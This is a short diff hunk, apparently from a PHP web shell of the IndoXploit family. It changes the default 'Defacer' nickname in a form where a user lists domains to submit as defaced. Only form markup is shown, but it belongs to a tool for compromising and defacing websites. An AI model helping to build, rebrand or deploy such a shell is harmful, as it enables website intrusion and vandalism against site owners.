@@ -1271,7 +1271,7 @@ if($_GET['logout'] == true) {
 	} else {
 		echo "<center><form method='post'>
 		<u>Defacer</u>: <br>
-		<input type='text' name='nick' size='50' value='IndoXploit'><br>
+		<input type='text' name='nick' size='50' value='Kuzura'><br>
 		<u>Domains</u>: <br>
 		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
 		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
